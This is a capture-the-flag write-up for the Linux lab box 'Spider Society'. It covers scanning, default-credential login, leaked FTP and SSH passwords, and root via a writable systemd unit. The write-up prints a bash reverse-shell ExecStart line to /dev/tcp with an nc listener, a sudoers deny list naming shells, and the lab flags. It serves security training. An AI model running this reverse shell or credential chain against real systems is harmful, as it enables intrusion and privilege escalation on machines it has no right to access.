---
title: "Spider Society - Writeup"
linkTitle: "Spider Society"
weight: 15
featured: true
platform: "PG"
name: "Spider Society"
os: "Linux"
difficulty: "Medium"
release: "18 Jul 2026"
ip: "192.168.151.214"
# Drop a real avatar at static/img/pg/spider-society.png and uncomment:
# avatar: "/img/pg/spider-society.png"
tags: ["linux", "web-enum", "ftp", "hidden-file-web-read", "credential-chaining", "systemd-service", "sudo-restricted-shell"]
description: "Medium Linux box. Default creds on a hidden control panel leak FTP credentials, a directory listing reveals a permission-restricted file readable only through the web server itself, and a writable systemd service closes the loop to root."
---

{{< htb name="Spider Society" os="Linux" difficulty="Medium" release="18 Jul 2026" ip="192.168.151.214" platform="PG" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 192.168.151.214
```

```
Open 192.168.151.214:22
Open 192.168.151.214:80
Open 192.168.151.214:2121
```

```
(root㉿kali)# nmap 192.168.151.214 -p 22,80,2121 -sCV
```

```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Spider Society
2121/tcp open  ftp     vsftpd 3.0.5
```

FTP on a non-standard port and a themed website are the two threads to pull.

## Enumeration

![Spider Society homepage footer showing a contact email that confirms the domain](/img/pg/spider-society/01-homepage.png)

The contact email confirms the internal domain, add it to `/etc/hosts`.

```
(root㉿kali)# echo "192.168.151.214 offsec.lab spidersociety.offsec.lab" >> /etc/hosts
```

```
(root㉿kali)# ffuf -u "HTTP://offsec.lab/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -c -e .php,.html
```

```
images      [Status: 301]
libspider   [Status: 301]
```

`/libspider` is a login panel.

![Spider Society Control Panel login page](/img/pg/spider-society/02-control-panel-login.png)

## Initial Foothold

Default credentials (`admin:admin`) log straight in, and the dashboard itself hands over another set of credentials on load.

![Control panel popup revealing FTP backup user credentials](/img/pg/spider-society/03-leaked-ftp-creds.png)

```
Username: ss_ftpbckuser
Password: ss_WeLoveSpiderSociety_From_Tech_Dept5937!
```

SSH refuses that account outright.

```
(root㉿kali)# ssh ss_ftpbckuser@192.168.151.214
```

```
Permission denied, please try again.
```

The FTP port on 2121 is the one it's actually meant for.

```
(root㉿kali)# ftp 192.168.151.214 -P 2121
```

```
230 Login successful.
ftp> cd libspider
ftp> ls -la
```

```
-r--------    1 33    33      170 Apr 14  2025 .fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
```

An obscurely-named file, owned by UID 33 (`www-data`), readable only by its owner. The FTP session can list it but not read its contents, permission denied on `cat`. Apache itself, however, runs as that exact owner, so requesting the same path over HTTP instead lets the web server read the file on the client's behalf.

```
(root㉿kali)# curl http://offsec.lab/libspider/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
```

![Browser displaying the hidden file's contents, leaking a second credential pair](/img/pg/spider-society/04-hidden-file-contents.png)

```
FTP_BACKUP_USER=ss_ftpbckuser
FTP_BACKUP_PASS=ss_WeLoveSpiderSociety_From_Tech_Dept5937!
DB_CONNECT_USER=spidey
DB_CONNECT_PASS=WithGreatPowerComesGreatSecurity99!
```

A real system username with what looks like a real password. Try it over SSH.

```
(root㉿kali)# ssh spidey@192.168.151.214
```

```
spidey@spidersociety:~$ whoami
```

```
spidey
```

```
spidey@spidersociety:~$ cat /home/spidey/local.txt
```

```
59d3a397acd0b215fdffb60b3a17fa12
```

## Privilege Escalation

```
spidey@spidersociety:~$ sudo -l
```

```
User spidey may run the following commands on spidersociety:
    (ALL) NOPASSWD: /bin/systemctl restart spiderbackup.service
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) !/bin/bash, !/bin/sh, !/bin/su, !/usr/bin/sudo
```

Only two commands allowed, and every obvious shell escape is explicitly blocked. The path in is the service itself, not a GTFOBins trick.

```
spidey@spidersociety:~$ find / -name "*.service" -writable 2>/dev/null
```

```
/etc/systemd/system/spiderbackup.service
```

```
spidey@spidersociety:~$ cat /etc/systemd/system/spiderbackup.service
```

```ini
[Unit]
Description=Spider Society Backup Service

[Service]
Type=simple
ExecStart=/usr/local/bin/spiderbackup.sh
User=root
Group=root
```

The unit file itself is writable, and it already runs as root. Swap the `ExecStart` line for a reverse shell.

```
spidey@spidersociety:~$ nano /etc/systemd/system/spiderbackup.service
```

```ini
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.217/4411 0>&1'
```

Reload systemd and trigger the service using exactly the two commands sudo allows.

```
spidey@spidersociety:~$ sudo /bin/systemctl daemon-reload
spidey@spidersociety:~$ sudo /bin/systemctl restart spiderbackup.service
```

```
(root㉿kali)# nc -lnvp 4411
```

```
connect to [192.168.45.217] from (UNKNOWN) [192.168.151.214] 43448
root@spidersociety:/#
```

```
# cat /root/proof.txt
```

```
619aadcca4214d8fbf52554bd2d7bf7c
```

## Lessons learned

- A restrictive sudoers entry that blocks every shell explicitly is still exploitable if it whitelists control over something that itself runs as root. `systemctl restart` on a writable unit file is just as good as a direct shell, the blocklist only stops the obvious paths, not the actual one.
- Unix file permissions only control who can read a file directly, not who can be served its contents by something else running as the owner. A file locked to `www-data` was unreadable over FTP but freely readable through Apache, since Apache *is* `www-data`.
- Never assume one enumeration channel shows the whole picture. FTP revealed the filename that HTTP could actually read, neither protocol alone would have gotten there.
